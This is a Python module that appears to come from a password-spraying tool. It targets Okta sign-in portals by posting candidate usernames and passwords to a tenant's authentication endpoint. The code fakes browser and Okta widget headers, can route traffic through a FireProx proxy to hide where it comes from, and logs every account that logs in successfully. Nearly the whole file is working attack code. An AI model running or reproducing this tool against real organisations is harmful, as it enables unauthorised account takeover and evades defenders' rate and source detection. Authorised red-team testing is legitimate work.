#!/usr/bin/env python3

# Import all the libraries for the different prtocols
import requests
import warnings
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

'''Function to spray okta portal'''
def okta_conn(params):

    username = params.get("username")
    password = params.get("password")
    #host = params.get("host")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    domain = params.get("host")
    oktadomain = domain + ".okta.com"
    originreferrer = 'https://' + oktadomain
    fprox = params.get("url")
    if params.get("url"):
        fproxurl = fprox.split('/')[2]
        oktaurl = "https://{}/fireprox/api/v1/authn".format(fproxurl)
    else:
        oktaurl = "https://{}/api/v1/authn".format(oktadomain)

    headers = {
        'Host': oktadomain,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0',
        'Accept': 'application/json',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip, deflate',
        'content-type': 'application/json',
        'x-okta-user-agent-extended': 'okta-signin-widget-4.1.2',
        'Content-Length': '212',
        'Origin': originreferrer,
        'Connection': 'close',
        'Referer': originreferrer
    }
    data = {"username":"{}".format(username),"options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":"{}".format(password)}

    try:

        # print the host , username and password being checked
        print(f"ACCOUNT CHECK: [OKTA] Target: {oktadomain} User: {username} [{place} of {count}, {place} completed] Password: {password}")
        query = requests.post(oktaurl,json=data,headers=headers)

        #print(query.status_code)
        if query.status_code == 200:
            print(f"ACCOUNT FOUND: [OKTA] Target: {oktadomain} User: {username} Password: {password} [SUCCESS]")
            if filelogger != None:
                filelogger.debug(f"ACCOUNT FOUND: [OKTA] Target: {oktadomain} User: {username} Password: {password} [SUCCESS]")
    
    except:
        pass
